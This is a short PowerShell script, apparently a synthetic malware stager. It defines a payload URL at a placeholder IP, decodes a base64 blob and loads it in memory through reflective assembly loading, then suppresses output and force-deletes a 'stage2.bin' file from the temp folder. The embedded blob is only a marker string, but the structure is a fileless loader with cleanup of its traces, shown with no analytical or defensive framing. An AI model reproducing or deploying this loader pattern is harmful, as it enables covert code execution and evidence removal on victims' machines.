
$FetchUrl = 'https://192.0.2.94/payload.bin'
$ErrorActionPreference = "Stop"

try {
    $AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpwODNib3p4bmpr')
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $TransferResult = [Reflection.Assembly]::Load($AssemblyBytes)
    if ($null -ne $TransferResult) {
        Write-Verbose ("Loaded assembly: " + $TransferResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
